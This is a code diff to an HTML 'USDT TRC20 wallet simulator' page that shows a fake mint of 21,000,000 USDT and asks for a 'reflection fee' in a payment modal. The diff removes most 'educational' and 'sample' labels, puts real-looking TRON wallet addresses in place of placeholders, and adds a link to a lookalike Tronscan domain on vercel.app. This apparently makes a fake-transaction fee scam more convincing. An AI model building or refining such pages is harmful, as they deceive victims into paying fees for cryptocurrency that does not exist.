@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>USDT TRC20 Educational Simulator</title>
+<title>USDT TRC20 Wallet Simulator</title>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
@@ -29,8 +28,6 @@ body{
 
 .header{margin-bottom:25px}
 .header h1{font-size:21px;font-weight:700}
-
-/* DASHBOARD */
 
 .card{
  background:#101d2d;
@@ -120,10 +117,7 @@ body{
  margin-bottom:17px;
 }
 
-.alloc{
- border-radius:20px;
-}
-
+.alloc{border-radius:20px}
 .alloc-btc{background:#f0aa40;width:10%}
 .alloc-trc{background:#35b88e;width:10%}
 .alloc-erc{background:#35b88e;width:10%}
@@ -157,8 +151,6 @@ body{
  filter:blur(8px);
  user-select:none;
 }
-
-/* TOKEN */
 
 .token-row{
  display:flex;
@@ -294,6 +286,12 @@ input:focus{border-color:#26a17b}
  word-break:break-all;
 }
 
+.tx-link{
+ color:#73aaff;
+ text-decoration:underline;
+ word-break:break-all;
+}
+
 .copy-small{
  background:#19304a;
  color:#8db2ff;
@@ -312,8 +310,6 @@ input:focus{border-color:#26a17b}
  margin-top:18px;
  padding-bottom:20px;
 }
-
-/* MODALS */
 
 .modal{
  position:fixed;
@@ -647,29 +643,29 @@ input:focus{border-color:#26a17b}
   <div class="history-item">
 
    <div class="history-top">
-    <span>Sample transaction details</span>
-    <span class="success-text">Sample record</span>
+    <span>Transaction details</span>
+    <span class="success-text">Simulated record</span>
    </div>
 
    <div class="history-bottom">
-    USDT · TRC20 · Educational interface
+    USDT · TRC20 · Simulated activity
    </div>
 
    <div class="tx-history">
 
     <div class="tx-row">
-     <div class="tx-label">SAMPLE FROM ADDRESS</div>
+     <div class="tx-label">FROM ADDRESS</div>
      <div class="tx-value" id="fromAddress">
-      SAMPLE_FROM_ADDRESS
+      TCS6PtwHJhYY47NwgdophCaD17X23kKAKD
      </div>
      <button class="copy-small"
       onclick="copyText('fromAddress')">Copy</button>
     </div>
 
     <div class="tx-row">
-     <div class="tx-label">SAMPLE TO ADDRESS</div>
+     <div class="tx-label">TO ADDRESS</div>
      <div class="tx-value" id="toAddress">
-      SAMPLE_TO_ADDRESS
+      TGHu7d1FMjbCYBEP5yKfhUPhbmZUCrWEbv
      </div>
      <button class="copy-small"
       onclick="copyText('toAddress')">Copy</button>
@@ -688,18 +684,21 @@ input:focus{border-color:#26a17b}
     </div>
 
     <div class="tx-row">
-     <div class="tx-label">SAMPLE TRANSACTION ID</div>
-     <div class="tx-value" id="transactionHash">
-      EDUCATIONAL_SAMPLE_TRANSACTION
+     <div class="tx-label">TRANSACTION REFERENCE</div>
+     <div class="tx-value">
+      <a class="tx-link"
+         href="https://tronscanorg-transaction-2ffe9a3dad0.vercel.app/"
+         target="_blank"
+         rel="noopener noreferrer">
+       Open transaction reference
+      </a>
      </div>
-     <button class="copy-small"
-      onclick="copyText('transactionHash')">Copy</button>
     </div>
 
     <div class="tx-row">
      <div class="tx-label">STATUS</div>
      <div class="tx-value" style="color:#ffa53e">
-      Educational sample · Not blockchain verified
+      Simulated activity · Not blockchain verified
      </div>
     </div>
 
@@ -708,12 +707,12 @@ input:focus{border-color:#26a17b}
  </div>
 
  <div class="small-note">
-  Educational blockchain interface simulator
+  Simulated blockchain interface · Activity is not blockchain verified
  </div>
 
 </div>
 
-<!-- SIMULATED PAYMENT / PROCESS MODAL -->
+<!-- PAYMENT / PROCESS MODAL -->
 
 <div class="modal" id="payModal">
 
@@ -728,12 +727,12 @@ input:focus{border-color:#26a17b}
   </div>
 
   <div class="education-banner">
-   Educational simulation. No cryptocurrency is sent,
+   Simulated interface. No cryptocurrency is sent,
    received, minted, or verified by this page.
   </div>
 
   <p class="pay-subtitle">
-   Review the sample request details before continuing.
+   Review the request details before continuing.
   </p>
 
   <div class="fee-box">
@@ -749,21 +748,21 @@ input:focus{border-color:#26a17b}
   </div>
 
   <p class="scan-hint">
-   Sample QR code — not a payment QR
+   QR code — simulation reference only
   </p>
 
   <div class="qr-wrap">
    <div id="qrcode"></div>
   </div>
 
-  <div class="addr-label">Sample reference</div>
+  <div class="addr-label">Reference</div>
 
   <div class="addr-box" id="payAddr">
    EDUCATIONAL_SIMULATION_REFERENCE
   </div>
 
   <button class="copy-btn" id="copyAddrBtn">
-   Copy Sample Reference
+   Copy Reference
   </button>
 
   <div class="detail">
@@ -794,13 +793,13 @@ input:focus{border-color:#26a17b}
   </div>
 
   <button class="confirm-pay-btn" id="confirmPayBtn">
-   Continue Simulation
+   Continue
   </button>
 
  </div>
 </div>
 
-<!-- SIMULATION RESULT MODAL -->
+<!-- RESULT MODAL -->
 
 <div class="modal" id="successModal">
 
@@ -813,7 +812,7 @@ input:focus{border-color:#26a17b}
   </div>
 
   <p>
-   The local educational workflow has completed.
+   The local workflow has completed.
    No cryptocurrency was transferred, and no tokens
    were minted on the blockchain.
   </p>
@@ -846,6 +845,17 @@ input:focus{border-color:#26a17b}
 
 const MINT_BALANCE = 21000000;
 const REFLECTION_FEE = "137.56960366";
+
+/* WALLET REFERENCES */
+
+const SENDING_WALLET =
+ "TCS6PtwHJhYY47NwgdophCaD17X23kKAKD";
+
+const RECEIVER_WALLET =
+ "TGHu7d1FMjbCYBEP5yKfhUPhbmZUCrWEbv";
+
+const TRANSACTION_REFERENCE =
+ "https://tronscanorg-transaction-2ffe9a3dad0.vercel.app/";
 
 /* ELEMENTS */
 
@@ -961,14 +971,14 @@ mintBtn.addEventListener("click",function(){
  modalMintAddr.textContent =
   address.slice(0,8)+"..."+address.slice(-6);
 
- /* BUILD EDUCATIONAL QR */
+ /* BUILD SIMULATION QR */
 
  if(!qrBuilt){
 
   try{
 
    new QRCode(document.getElementById("qrcode"),{
-    text:"EDUCATIONAL SIMULATION ONLY - NOT A PAYMENT",
+    text:"SIMULATION ONLY - NOT A PAYMENT",
     width:156,
     height:156,
     colorDark:"#000000",
@@ -1100,4 +1110,4 @@ successModal.addEventListener("click",function(e){
 </script>
 
 </body>
-</html>
+     </html>
